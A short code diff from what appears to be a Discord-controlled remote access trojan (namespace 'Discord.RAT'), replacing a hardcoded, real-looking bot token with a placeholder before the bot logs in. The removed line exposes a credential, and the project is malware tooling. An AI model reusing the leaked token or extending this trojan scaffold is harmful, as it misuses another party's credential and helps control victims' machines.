@@ -32,7 +32,7 @@ namespace Discord.RAT
 
             await Handler.Init(Client);
             #region Token
-            var token = "OTE0MDIyMTcxMTg0MTAzNDM0.YaG_ew.EeOV9p9BgHf9Axwt5sSl9tX3on4";
+            var token = "YOUR_TOKEN_HERE";
             #endregion Token
             await Client.LoginAsync(TokenType.Bot, token);
             await Client.StartAsync();
